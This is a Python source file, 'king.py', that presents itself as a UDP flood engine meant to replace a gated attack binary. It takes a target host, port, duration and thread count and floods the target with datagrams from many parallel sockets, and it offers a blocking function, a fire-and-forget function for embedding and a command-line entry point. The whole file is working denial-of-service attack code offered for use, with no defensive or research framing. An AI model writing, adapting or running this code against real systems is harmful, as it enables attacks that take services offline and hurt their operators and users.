#!/usr/bin/env python3
"""
king.py — UDP flood engine.

Direct Python replacement for the gated ELF binary `king`.
Same signature: <IP> <PORT> <DURATION> <THREADS>

Accepts target in these shapes:
    '1.2.3.4'
    '1.2.3.4:443'
    'host.com'
    'host.com:443'
    '[::1]:443'   -> raises ValueError (IPv6 not supported by this engine)

No browser gate. No subprocess. No external calls.

Exports:
    attack(target, port, duration, threads=100, payload_size=1024)  -> int
        Blocking. Returns number of worker threads that ran.
    start_attack(target, port, duration, threads=100, payload_size=1024) -> Thread
        Fire-and-forget. Returns the background thread.
    _resolve(target) -> str
        Host/IP normalizer used internally; safe to call directly.
"""

import socket
import sys
import threading
import time

__all__ = ["attack", "start_attack", "_resolve"]


# ── target normalization ──────────────────────────────────────────────────

def _resolve(target):
    """
    Return an IPv4 dotted-quad string from target.

    Strips one trailing ':port' if present. Handles IPv6 brackets by
    raising ValueError (this engine is IPv4-only). Falls back to DNS for
    hostnames.

    Raises:
        ValueError       — empty/malformed target, or IPv6
        socket.gaierror  — DNS failure
    """
    if not isinstance(target, str) or not target.strip():
        raise ValueError(f"empty target: {target!r}")

    t = target.strip()

    # IPv6 in brackets — [::1] or [::1]:443
    if t.startswith("["):
        end = t.find("]")
        if end == -1:
            raise ValueError(f"malformed IPv6 target: {target!r}")
        inner = t[1:end]
        try:
            socket.inet_pton(socket.AF_INET6, inner)
        except OSError as e:
            raise ValueError(f"invalid IPv6 address: {target!r}") from e
        raise ValueError(f"IPv6 target not supported by this engine: {target!r}")

    # Strip one trailing ':port' if present. Single colon only, so bare
    # IPv6 addresses (multiple colons) are not mangled — they fall through
    # to the DNS branch and fail with gaierror, which is acceptable.
    if t.count(":") == 1:
        host, _, maybe_port = t.partition(":")
        if maybe_port.isdigit() and 0 < int(maybe_port) < 65536:
            t = host

    # Try as IPv4 literal
    try:
        socket.inet_pton(socket.AF_INET, t)
        return t
    except OSError:
        pass

    # Fall back to DNS
    return socket.gethostbyname(t)


# ── worker ────────────────────────────────────────────────────────────────

def _worker(sock, ip, port, end_time, payload):
    """Tight send loop until end_time. Swallows per-packet OS errors."""
    while time.time() < end_time:
        try:
            sock.sendto(payload, (ip, port))
        except OSError:
            pass


# ── public API ────────────────────────────────────────────────────────────

def attack(target, port, duration, threads=100, payload_size=1024):
    """
    Blocking UDP flood.

    target       : str  — IP or hostname (with optional :port)
    port         : int  — target port
    duration     : int  — seconds
    threads      : int  — worker count (one socket per worker)
    payload_size : int  — bytes per datagram

    Returns int — number of workers actually started.

    Raises:
        ValueError    — bad input, unresolvable target, IPv6
        socket.gaierror — DNS failure
        RuntimeError  — socket or thread creation failed
    """
    # validate port/duration/threads first so a bad target doesn't hide a
    # worse arg mistake
    try:
        port = int(port)
    except (TypeError, ValueError):
        raise ValueError(f"port must be an integer, got {port!r}")
    if not (0 < port < 65536):
        raise ValueError(f"port out of range: {port}")

    try:
        duration = int(duration)
    except (TypeError, ValueError):
        raise ValueError(f"duration must be an integer, got {duration!r}")
    if duration <= 0:
        raise ValueError(f"duration must be > 0, got {duration}")

    try:
        threads = int(threads)
    except (TypeError, ValueError):
        raise ValueError(f"threads must be an integer, got {threads!r}")
    if threads <= 0:
        raise ValueError(f"threads must be > 0, got {threads}")

    try:
        payload_size = int(payload_size)
    except (TypeError, ValueError):
        raise ValueError(f"payload_size must be an integer, got {payload_size!r}")
    if payload_size <= 0:
        raise ValueError(f"payload_size must be > 0, got {payload_size}")

    # resolve last — target parse errors now surface to caller
    ip = _resolve(target)

    end_time = time.time() + duration
    payload = b"\x00" * payload_size

    socks = []
    for _ in range(threads):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            socks.append(s)
        except OSError:
            break

    if not socks:
        raise RuntimeError("Socket creation failed")

    workers = []
    for s in socks:
        t = threading.Thread(
            target=_worker,
            args=(s, ip, port, end_time, payload),
            daemon=True,
        )
        try:
            t.start()
            workers.append(t)
        except RuntimeError:
            break

    if not workers:
        for s in socks:
            try:
                s.close()
            except OSError:
                pass
        raise RuntimeError("Thread creation failed")

    for t in workers:
        t.join()

    for s in socks:
        try:
            s.close()
        except OSError:
            pass

    return len(workers)


def start_attack(target, port, duration, threads=100, payload_size=1024):
    """
    Non-blocking. Spawns attack() in a daemon thread and returns the Thread.
    Exceptions inside the thread are NOT propagated — pre-validate in the
    caller or wrap attack() inline if you need to catch failures.
    """
    t = threading.Thread(
        target=attack,
        args=(target, port, duration, threads, payload_size),
        daemon=True,
    )
    t.start()
    return t


# ── CLI ───────────────────────────────────────────────────────────────────

def _main(argv):
    if len(argv) != 5:
        print(f"Usage: {argv[0]} <IP|host[:port]> <PORT> <DURATION> <THREADS>")
        return 1

    _, target, port, duration, threads = argv
    try:
        n = attack(target, int(port), int(duration), int(threads))
    except (ValueError, RuntimeError, socket.gaierror) as e:
        print(f"Error: {e}", file=sys.stderr)
        return 2

    print(f"dispatched {n} workers")
    return 0


if __name__ == "__main__":
    sys.exit(_main(sys.argv))
